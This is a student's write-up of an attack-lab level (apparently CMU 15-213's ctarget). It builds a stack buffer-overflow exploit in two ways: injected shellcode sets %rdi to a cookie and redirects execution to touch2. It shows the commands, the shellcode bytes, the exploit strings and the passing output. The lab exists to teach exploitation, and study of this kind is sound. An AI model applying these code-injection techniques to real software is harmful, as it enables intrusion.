# Level 1

In this level, we need to inject a small amount of code as part of exploit string. The task is
to get `CTARGET` to execute the code for `touch2` rather than returning to `test`. Furthermore,
we must passed our cookie as its argument. 

Find the address of `touch2` function: 

```
danghai@ubuntu:~/Security_Exploit/attack_lab$ objdump -d ctarget > asm.d
danghai@ubuntu:~/Security_Exploit/attack_lab$ grep -i "touch2" asm.d
00000000004017ec <touch2>:
```
==> Address of `touch2`: `0x04017ec`

Recall that the first argument to a function is passed in register `%rdi`. It means that we
inject the code that should set the register to our cookie, and then transfer control to the first
instruction in `touch2`. There are two ways to do that: 

1. We can transfer control to `Stack`, and then execute the code that we inject at `Stack`. In 
Stack, we push address of function `touch2` and return. 

2. We can also transfer control to `Stack`, and also execute the code that we inject. But we return 
immediately without push address of function `touch2`. The address `touch2` is put after returnning
from stack. 

Our Cookie:

```
danghai@ubuntu:~/Security_Exploit/attack_lab$ cat cookie.txt 
0x59b997fa
```

### 1st method:

Creat the injected code and compile them. In injected code, we modify the `%rdi` with our Cookie. Push 
`touch2` address and then `ret`. 

```
danghai@ubuntu:~/Security_Exploit/attack_lab$ nano asm_level1_1.s 
danghai@ubuntu:~/Security_Exploit/attack_lab$ gcc -c asm_level1_1.s
danghai@ubuntu:~/Security_Exploit/attack_lab$ objdump -d asm_level1_1 asm_level1_1.d
danghai@ubuntu:~/Security_Exploit/attack_lab$ objdump -d asm_level1_1.o > asm_level1_1.d
```

We got this: 

```asm
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq
```

Find the address `%rsp` before smashing them at `getbufn` by putting breakpoint at `getbufn+7`. And `run -q`. 
Typing `print /x $rsp`, we can get information register `%rsp`: `0x5561dc78`. Therefore, creating the exploit string:


```
	danghai@ubuntu:~/Security_Exploit/attack_lab$ perl -e 'print "48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 ", "61 "x27,"78 dc 61 55"' > hex_level1_1
	danghai@ubuntu:~/Security_Exploit/attack_lab$ ./hex2raw <hex_level1_1> raw_level1_1
	danghai@ubuntu:~/Security_Exploit/attack_lab$ ./ctarget -q < raw_level1_1
```

!Good, we got this: 

```
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 78 DC 61 55 
```

### 2nd method:

Similarly, we create the injected code with only modyfing `%rdi` and then return. 

```
danghai@ubuntu:~/Security_Exploit/attack_lab$ nano asm_level1_2.s
danghai@ubuntu:~/Security_Exploit/attack_lab$ gcc -c asm_level1_2.s
danghai@ubuntu:~/Security_Exploit/attack_lab$ objdump -d asm_level1_2.o > asm_level1_2.d
danghai@ubuntu:~/Security_Exploit/attack_lab$ cat asm_level1_2.d
```

We got this: 

```asm
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	c3                   	retq
```

We create the exploit string:

```
	danghai@ubuntu:~/Security_Exploit/attack_lab$ perl -e 'print "48 c7 c7 fa 97 b9 59 c3 ", "61 "x32,"78 dc 61 55 ","00 "x4,"ec 17 40 00"' > hex_level1_2
	danghai@ubuntu:~/Security_Exploit/attack_lab$ ./hex2raw <hex_level1_2> raw_level1_2
	danghai@ubuntu:~/Security_Exploit/attack_lab$ ./ctarget -q < raw_level1_2
```

!Good, we again got this:

```
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 C3 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 78 DC 61 55 00 00 00 00 EC 17 40 00 
```
